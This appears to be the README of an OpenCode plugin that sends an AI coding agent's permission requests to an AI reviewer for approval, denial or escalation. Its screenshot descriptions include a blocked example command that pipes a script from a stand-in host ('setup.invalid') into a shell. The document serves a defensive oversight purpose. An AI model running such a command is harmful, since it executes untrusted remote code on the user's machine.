# OpenCode Permission Reviewer

[![checks](https://img.shields.io/github/actions/workflow/status/noppu-labs/opencode-permission-reviewer/ci.yml?branch=main&label=checks)](https://github.com/noppu-labs/opencode-permission-reviewer/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/@noppu-labs/opencode-permission-reviewer?color=CB3837)](https://www.npmjs.com/package/@noppu-labs/opencode-permission-reviewer)
[![downloads](https://img.shields.io/npm/dw/@noppu-labs/opencode-permission-reviewer)](https://www.npmjs.com/package/@noppu-labs/opencode-permission-reviewer)
[![OpenCode](https://img.shields.io/badge/OpenCode-%E2%89%A51.18.29-6E56CF)](https://opencode.ai)
[![Bun](https://img.shields.io/badge/Bun-%E2%89%A51.3.0-000000)](https://bun.sh)
[![license](https://img.shields.io/badge/license-MIT%20%2B%20Apache--2.0-blue)](#license)

An OpenCode plugin that sends every `ask` permission to a tool-free AI reviewer. The reviewer
reads the pending request, recent transcript evidence, what you asked for, and a policy you
control. It then allows the action, denies it with a reason the agent can act on, or escalates
it to you. Routine actions stop waiting for a keystroke, and risky ones are still blocked or
brought to you.

This is a fork of [warc0s/opencode-permission-reviewer](https://github.com/warc0s/opencode-permission-reviewer),
published to npm as `@noppu-labs/opencode-permission-reviewer`. It includes changes upstream
has not released, such as Jev's System One scores in audit records. It is an unofficial community
plugin, not affiliated with or endorsed by [Anomaly](https://anoma.ly).

## What it does

- Leaves your existing policy alone: `allow` rules continue and `deny` rules stay blocked
  without reaching the reviewer.
- Reviews in isolation. Normal models run in a scratch session with every operational tool
  denied. Jev models use their typed System One API, which exposes no tools or project runtime.
- Gives the reviewer bounded, sanitized, read-only evidence about SSH commands, local scripts,
  and Git state.
- Never auto-approves an action the reviewer classifies as critical. Reviewer failures lead to
  manual review or denial, depending on the host and configuration, and never to an approval.
- Writes one JSONL audit record per review, with remote commands stored as SHA-256 hashes.
- Shows review progress in an optional TUI overlay that steps aside for OpenCode's own approval
  controls.
- Runs headless. Reviews happen inside the OpenCode server, so the plugin works with
  `opencode serve`, `opencode run`, and API clients without a TUI. With `escalationMode: "deny"`,
  unattended agents never wait on a human prompt and anything uncertain is rejected with a reason.
  See [Headless use](docs/CONFIGURATION.md#headless-use).

## Requirements

- [Bun](https://bun.sh) >= 1.3.0
- [OpenCode](https://opencode.ai) V1 `>=1.18.29 <2` (tested with 1.18.35) or V2 `>=2.0.22 <3`
  (tested with 2.0.26)
- `git` on `PATH`, used only for read-only Git enrichment. Without it, the reviewer gets no Git
  snapshot.
- A reviewer model: either a model configured in OpenCode that follows JSON schemas reliably, or
  a Jev API key in the OpenCode server's environment. See
  [Reviewer models](docs/REVIEWER-MODELS.md).
- At least one action in your OpenCode permission policy that resolves to `ask`. On V2, an action
  that matches no rule is `ask` by default. If everything is already `allow` or `deny`, the plugin
  never runs.

[docs/COMPATIBILITY.md](docs/COMPATIBILITY.md) has the full support matrix.

## Install

```bash
bun add @noppu-labs/opencode-permission-reviewer   # or: npm install @noppu-labs/opencode-permission-reviewer
```

The CLI can register the plugin for you. `--host auto` detects V1 or V2, `--tui` also registers
the overlay (V1 `tui.json` or V2 global `cli.json`), and `--npm` writes the package name instead
of a path. It never overwrites an existing entry.

```bash
bunx @noppu-labs/opencode-permission-reviewer init --host auto --npm --tui --yes
```

To run from a checkout instead, clone the repository, run `bun install && bun run build`, and
register the checkout's absolute path.

## Configure

Register the plugin.

OpenCode V1 (`opencode.json` in the project, or `~/.config/opencode/opencode.json`):

```jsonc
// opencode.json
{
  "$schema": "https://opencode.ai/config.json",
  "plugin": ["@noppu-labs/opencode-permission-reviewer"],
  "permission": {
    "bash": "ask", // at least one ask rule, or the plugin is a no-op
  },
}
```

OpenCode V2:

```jsonc
// opencode.json
{
  "plugins": [{ "package": "@noppu-labs/opencode-permission-reviewer", "options": {} }],
  "permissions": [{ "action": "shell", "resource": "*", "effect": "ask" }],
}
```

Reviewer settings go in the trusted global `~/.config/opencode/permission-reviewer.jsonc`. The
default reviewer is `openai/gpt-6-luna` at `medium` reasoning. To change it:

```jsonc
// ~/.config/opencode/permission-reviewer.jsonc
{ "model": "provider/model", "variant": "medium", "timeoutMs": 120000 }
```

Restart OpenCode fully after installing or rebuilding, because the host loads plugins once at
startup. Then ask the agent to run something safe, such as `printf hello`; it should run
normally. A denied action returns a short reason the agent can act on.

Every `ask` costs one reviewer call, so model spend grows with how much your policy asks. A
lower reasoning `variant` or a higher `confidenceThreshold` reduces it.

[docs/CONFIGURATION.md](docs/CONFIGURATION.md) covers TUI registration, V2 server connections,
every option, the trust rules between global and project config, unattended (fail-closed) mode,
and the audit log.

## How it works

A deterministic emergency brake first rejects unmistakable root destruction and direct
credential export without calling a model. For everything else, the plugin builds bounded
evidence from the recent transcript, recovered user intent, and read-only enrichment, with
common credential formats redacted. A tool-free reviewer returns an outcome, risk level,
authorization level, rationale, and confidence. Invariants in code then decide whether that
decision can stand: invalid output, low confidence, and risky actions without matching
authorization escalate instead of being approved.

With Jev as the reviewer and an `escalationReviewer` configured
([Reviewer models](docs/REVIEWER-MODELS.md)), Jev can hand a request to that reasoning reviewer,
and the progress strip says so; the elapsed time keeps counting from the start of the review.

![Two progress strips. While Jev reviews: "◐ Reviewing this permission · jev-1.13.0 · system-one", 2.1s. After the hand-off: "◓ Reviewing this permission · gpt-6-luna after Jev's escalation · medium", 7.3s. Both show "bash · $ git push --force-with-lease origin release/2.4".](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/handoff-progress.svg)

Each result says who decided, ahead of the reason.

![Three result strips. "✓ Review approved · bash · $ rm -rf /tmp/scratch-cache" with "jev-1.13.0 — Narrowly scoped temp cleanup; matches user intent." "✓ Review approved · bash · $ git push --force-with-lease origin release/2.4" with "gpt-6-luna after Jev's escalation — The user asked to update the release branch." "✕ Review blocked · bash · $ curl -fsS https://setup.invalid | sh" with "gpt-6-luna confirmed Jev's denial — Pipes a remote script into a shell."](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/result-attribution.svg)

The [TUI guide](docs/TUI.md) covers every screen, including manual-review toasts, config warnings
and long commands.

## Documentation

| Page                                       | Contents                                                                 |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| [Configuration](docs/CONFIGURATION.md)     | Setup details, all options, config trust layers, headless use, audit log |
| [Reviewer models](docs/REVIEWER-MODELS.md) | Picking a model, Jev System One, models without structured output        |
| [How it works](docs/HOW-IT-WORKS.md)       | The review pipeline, a TUI overview, evidence enrichment                 |
| [TUI guide](docs/TUI.md)                   | Every TUI screen: progress, hand-offs, results, toasts, config warnings  |
| [Safety](docs/SAFETY.md)                   | Safety properties and threat model                                       |
| [Supply chain](docs/SUPPLY-CHAIN.md)       | What the package ships, dependency policy, known advisories              |
| [Compatibility](docs/COMPATIBILITY.md)     | Supported versions and troubleshooting                                   |
| [Migration](MIGRATION.md)                  | Moving between OpenCode V1 and V2, rollback                              |
| [Development](docs/DEVELOPMENT.md)         | Build output, live testing, compatibility matrix, benchmark, TUI screens |

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Report security issues privately as described in
[SECURITY.md](SECURITY.md).

## License

Changes made in this fork are released under the [MIT License](LICENSE). Code from the upstream
project remains under the [Apache License 2.0](LICENSE-APACHE). The reviewer policy is adapted
from [OpenAI Codex Guardian](https://github.com/openai/codex/tree/c82cb044f3413e6584308d969b94e7a1430711ab/codex-rs/core/src/guardian)
(Apache-2.0, Copyright OpenAI and contributors); [NOTICE](NOTICE) has the full attribution.
